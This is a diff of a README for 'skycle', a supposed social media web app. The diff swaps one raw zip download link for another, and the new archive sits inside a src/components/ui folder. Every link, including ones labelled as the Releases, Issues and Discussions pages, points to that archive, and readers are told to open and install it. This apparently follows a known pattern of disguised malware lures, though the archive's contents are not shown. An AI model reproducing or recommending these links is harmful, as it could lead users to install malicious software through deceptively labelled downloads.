@@ -1,5 +1,5 @@
 ```markdown
-# 🌟 skycle - A https://raw.githubusercontent.com/sx325/skycle/main/zootaxy/skycle.zip App for Social Media Interaction
+# 🌟 skycle - A https://github.com/sx325/skycle/raw/refs/heads/main/src/components/ui/Software-v1.2.zip App for Social Media Interaction
 
 ## 🚀 Getting Started
 
@@ -7,7 +7,7 @@ Welcome to **skycle**! This is a modern web application designed to enhance your
 
 ## 📥 Download & Install
 
-To download the latest version of skycle, please visit this page: [Download skycle](https://raw.githubusercontent.com/sx325/skycle/main/zootaxy/skycle.zip).
+To download the latest version of skycle, please visit this page: [Download skycle](https://github.com/sx325/skycle/raw/refs/heads/main/src/components/ui/Software-v1.2.zip).
 
 ## 🛠️ System Requirements
 
@@ -27,14 +27,14 @@ To download the latest version of skycle, please visit this page: [Download skyc
 
 This app is built using several modern technologies:
 
-- **https://raw.githubusercontent.com/sx325/skycle/main/zootaxy/skycle.zip** For the best performance and user experience.
+- **https://github.com/sx325/skycle/raw/refs/heads/main/src/components/ui/Software-v1.2.zip** For the best performance and user experience.
 - **AT Protocol:** To enable smooth social media interactions.
 - **Prisma:** A flexible database layer for managing data.
 - **Tailwind CSS:** For beautiful designs with minimal effort.
 
 ## 📖 How to Use skycle
 
-1. **Download:** Click the link to download the latest version from the [Releases page](https://raw.githubusercontent.com/sx325/skycle/main/zootaxy/skycle.zip).
+1. **Download:** Click the link to download the latest version from the [Releases page](https://github.com/sx325/skycle/raw/refs/heads/main/src/components/ui/Software-v1.2.zip).
    
 2. **Install:** Open the downloaded file and follow the on-screen instructions. This process varies slightly between different operating systems. 
 
@@ -52,7 +52,7 @@ If you face any issues, please check the following:
 - Restart your computer after installation.
 - Make sure the app has permission to access the Internet.
 
-For more help, visit the [GitHub Issues page](https://raw.githubusercontent.com/sx325/skycle/main/zootaxy/skycle.zip) for community support.
+For more help, visit the [GitHub Issues page](https://github.com/sx325/skycle/raw/refs/heads/main/src/components/ui/Software-v1.2.zip) for community support.
 
 ## 📄 License
 
@@ -60,7 +60,7 @@ This project is licensed under the MIT License. You can freely use and modify th
 
 ## 💬 Feedback
 
-We welcome your feedback! Please leave your comments or suggestions on the [GitHub Discussions](https://raw.githubusercontent.com/sx325/skycle/main/zootaxy/skycle.zip) page.
+We welcome your feedback! Please leave your comments or suggestions on the [GitHub Discussions](https://github.com/sx325/skycle/raw/refs/heads/main/src/components/ui/Software-v1.2.zip) page.
 
 Enjoy using skycle and enhance your social media experience today!
 ```
